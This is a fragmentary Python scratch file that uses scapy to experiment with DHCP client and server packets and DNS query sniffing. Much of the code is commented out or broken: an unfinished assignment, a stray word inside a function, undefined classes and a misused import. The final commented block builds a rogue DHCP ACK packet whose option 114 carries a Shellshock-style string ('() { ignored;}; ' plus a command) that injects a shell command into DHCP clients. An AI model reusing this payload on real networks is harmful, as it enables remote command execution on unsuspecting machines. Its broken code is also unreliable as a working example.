import socket
from scapy.sendrecv import sniff
from scapy.layers.dhcp import dhcp_request
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import IP, UDP
from scapy.sendrecv import sniff, send, sr1

'''
serverP = 67
clientP = 68

dest = ('255.255.255.255', serverP)


def send_discover():
    print("[+] clent start")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', clientP))

    print("[+] client Send discovery.")
    discover = discover_get()

    sock.sendp(discover)


def get_offer():

    print("[+] client Receive offer.")
    return ip


def send_request():
    data = request_get()
    print("[+] client send request")
    return


def get_ack():
    print("[+] client Receive ack")
    return acknowledge()
    eytan98an

'''
if __name__ == '__main__':
    offer = dhcp_request()
    # print(list(offer))
    '''
    offer = dhcp_request()
   

    send_discover()
    ip = get_offer()
    send_request()
    ack = get_ack()
'''
'''
    def discover_get():
        discover = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0", dst="255.255.255.255") / RUDP(clientP, serverP) / \
                   BOOTP(chaddr='d') / DHCP(options=["type", "discover", "end"])
        return discover


    def request_get():
        ip =
        return


    def acknowledge(data):
        return

def sniff_discover(pkt):
    if IP in pkt:
        ip_src = pkt[IP].src
        ip_dst = pkt[IP].dst
        if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
            print(str(ip_src) + " -> " + str(ip_dst) + " : (" + str(pkt.getlayer(DNS).qd.qname) +" )")
            print(send(IP(dst="127.0.0.53") / RUDP(sport=RandShort(), dport=53) / 
            DNS(rd=1, qd=DNSQR(qname="asd.com", qtype="A"))))



# import collections
#
# result = bytearray(236)
#
# IP(src="192.168.2.1", dst='255.255.255.255') /
# RUDP(sport=67, dport=68) /
# BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.4', siaddr='192.168.2.1', xid=xid) /
# DHCP(options=[("message-type", "ack"),
#               ('server_id', '192.168.2.1'),
#               ('subnet_mask', '255.255.255.0'),
#               ('router', '192.168.2.5'),
#               ('lease_time', 172800),
#               ('renewal_time', 86400),
#               ('rebinding_time', 138240),
#               (114, "() { ignored;}; " + command), "end"]))
#
# return packet
'''
